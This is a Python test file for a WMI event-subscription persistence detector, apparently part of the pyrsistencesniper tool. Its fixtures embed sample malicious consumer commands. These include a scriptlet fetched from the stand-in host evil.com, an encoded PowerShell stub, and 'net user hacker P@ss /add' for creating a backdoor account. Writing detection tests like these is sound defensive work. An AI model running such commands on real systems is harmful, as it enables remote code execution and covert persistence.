from __future__ import annotations

from typing import TYPE_CHECKING

from pyrsistencesniper.models.finding import AccessLevel

if TYPE_CHECKING:
    from pathlib import Path
from pyrsistencesniper.plugins.T1546.wmi_subscriptions import WmiEventSubscription

from .conftest import make_deps


def _make_plugin(tmp_path: Path) -> WmiEventSubscription:
    context, _registry, _filesystem, _profile = make_deps(tmp_path)
    return WmiEventSubscription(context=context)


def test_commandline_utf16_match(tmp_path: Path) -> None:
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)

    cmd = "powershell.exe -enc AAAA"
    keyword = "CommandLineTemplate"
    payload = keyword.encode("utf-16-le") + b"\x00\x00" + cmd.encode("utf-16-le")
    (repo / "OBJECTS.DATA").write_bytes(b"\x00" * 100 + payload + b"\x00" * 100)

    plugin = _make_plugin(tmp_path)
    findings = plugin.run()
    assert len(findings) >= 1
    assert any("powershell" in f.value.lower() for f in findings)
    assert all(f.access_gained == AccessLevel.SYSTEM for f in findings)


def test_scripttext_ascii_match(tmp_path: Path) -> None:
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)

    script = 'GetObject("script:http://evil.com/payload.sct")'
    payload = b"ScriptText\x00" + script.encode("ascii")
    (repo / "OBJECTS.DATA").write_bytes(b"\x00" * 50 + payload + b"\x00" * 50)

    plugin = _make_plugin(tmp_path)
    findings = plugin.run()
    assert len(findings) >= 1
    assert any("evil.com" in f.value for f in findings)


def test_fs_variant_path(tmp_path: Path) -> None:
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository" / "FS"
    repo.mkdir(parents=True)

    cmd = "cmd.exe /c whoami"
    keyword = "CommandLineTemplate"
    payload = keyword.encode("utf-16-le") + b"\x00\x00" + cmd.encode("utf-16-le")
    (repo / "OBJECTS.DATA").write_bytes(payload)

    plugin = _make_plugin(tmp_path)
    findings = plugin.run()
    assert len(findings) >= 1


def test_no_matching_patterns(tmp_path: Path) -> None:
    """OBJECTS.DATA exists but contains no WMI consumer patterns."""
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)
    (repo / "OBJECTS.DATA").write_bytes(
        b"\x00" * 500 + b"RandomGarbage" + b"\x00" * 500
    )

    plugin = _make_plugin(tmp_path)
    assert plugin.run() == []


def test_commandline_ascii_match(tmp_path: Path) -> None:
    """CommandLineTemplate in ASCII encoding."""
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)

    cmd = "cmd.exe /c net user hacker P@ss /add"
    payload = b"CommandLineTemplate\x00" + cmd.encode("ascii")
    (repo / "OBJECTS.DATA").write_bytes(b"\x00" * 50 + payload + b"\x00" * 50)

    plugin = _make_plugin(tmp_path)
    findings = plugin.run()
    assert len(findings) >= 1
    assert any("net user" in f.value for f in findings)


def test_scripttext_utf16_match(tmp_path: Path) -> None:
    """ScriptText in UTF-16-LE encoding."""
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)

    script = 'WScript.Shell.Run("calc.exe")'
    keyword = "ScriptText"
    payload = keyword.encode("utf-16-le") + b"\x00\x00" + script.encode("utf-16-le")
    (repo / "OBJECTS.DATA").write_bytes(b"\x00" * 50 + payload + b"\x00" * 50)

    plugin = _make_plugin(tmp_path)
    findings = plugin.run()
    assert len(findings) >= 1
    assert any("calc.exe" in f.value for f in findings)
